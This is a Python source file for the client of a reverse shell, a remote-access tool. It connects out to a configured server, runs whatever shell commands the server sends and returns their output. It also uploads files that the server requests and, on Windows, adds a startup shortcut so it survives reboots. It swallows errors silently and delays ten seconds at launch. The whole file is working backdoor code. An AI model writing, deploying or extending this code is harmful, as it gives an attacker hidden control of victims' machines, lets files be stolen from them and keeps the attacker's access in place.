"""
MIT License

Copyright (c) 2022 greed albadi

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""





import socket
import os
import threading
import sys
import time
sys.path.insert(0, '..')
from data import data as dt
from data import basic
from controller import client_side
from background import backstuff
client_side = client_side.client_side()
class Rever:

    def __init__(self, host: str, port: int):

        """

        called when class is requested
        :param host: server address
        :param port: server port

        """
        self.server = client_side.formate_socket()
        self.filetrans_server = client_side.formate_socket()
        """
        :var self.server - request creation of main server
        :var self.filetrans_server - request creation of file transfer server
        
        """
        self.port = port
        self.host = host
        """
        :var self.port - define port
        :var self.host - define host
        """

    def connect(self, host, port):
        """

        :param host: targeted server address
        :param port: targeted server \ targeted port
        :return: not really important
        """
        return client_side.connect(self.server, host, port)

    def filetrans_recv(self):
        while True:
            time.sleep(1)
            """
            
            loop - wait for files from server
            
            """
            try:
                res = self.filetrans_server.recv(dt.BUFFER_SIZE)
                client_side.filetrans_recv(response=res)
                """
                when file is received it goes to
                the process of building it
                
                """
            except:
                """
                
                :except if there was exception it'll just continue \ new round of the loop
                mostly of server timeout
                
                """
                continue


    def filetrans_send(self, filename):
        """

        :param filename: requested file by server command
        :var data: read and modify file bytes as pickle
        dt.BUFFER - buffer size
        self.filetrans_server.send(data) - sends file to server as pickle
        :return: None

        """
        data = client_side.filetrans_readprocess(filename, dt.BUFFER_SIZE)
        self.filetrans_server.send(data)
        self.send(f"FILE: {filename} sent from {socket.gethostbyname(socket.gethostname())}\n")
        return

    def shortcut(self, path, dir):

        """

        :param path:  file name to shortcut
        :param dir: targeted location
        :return: create the startup shortcut
        """

        return backstuff.startup_shortcut(path, dir)

    def connect_tofiletrans(self, host, port):
        """
        host arg and port from main fun

        """
        to = (host, port)
        return client_side.connect(self.filetrans_server, host, port)


    def recv(self):
        """
        decode -- utf-8
        return -- data by server
        buffer -- 1024
        """
        return self.server.recv(int(dt.BUFFER_SIZE)).decode(dt.CODE_FORMATE)

    def runcommand(self, command: str):
        """
        :param command: no need to explain
        :return: run command
        """
        return backstuff.runcommand(command)

    def send(self, data):
        """

        :param data: data to send to main erver socket
        :return: send data to main socket

        """
        return client_side.send(self.server, data)

    def main(self):
        """

        :return: there is no return keeps running forever

        check if exe is in directory and checking the os
        if it's windows
        if it's nt It'll create shortcut on start up
        """
        if "client.exe" in os.listdir() and os.name == "nt":
            self.shortcut("client.bat", dt.WIN_STARTUP_PATH)

        """
        
        connect to main server
        connect to filetrans server
        
        """
        self.connect(self.host, self.port)
        self.connect_tofiletrans(self.host, self.port - dt.FILETRANS_PORT)
        """
        starts filetrans receiving thread
        """
        threading.Thread(target=self.filetrans_recv).start()
        while True:
            time.sleep(1)
            """
            receive data from main server
            first checks if It's not a command
            that's not a os command \cmd\\terminal
            
            """
            data = self.recv()
            # checks if first 2 chars are cd if they are It'll cd to the rest
            if data[:2] == "cd":
                try:
                    os.chdir(data[3:])
                    self.send('')
                except:
                    self.send("The system cannot find the path specified.")

            elif data[:8] == "reqfile:":
                self.filetrans_send(data[8:])

            else:

                response = self.runcommand(data)

                self.send(response.decode("utf-8"))

if __name__ == "__main__":
    time.sleep(10)
    c = Rever(str(basic.HOST), int(basic.PORT))

    try: c.main()
    except: pass

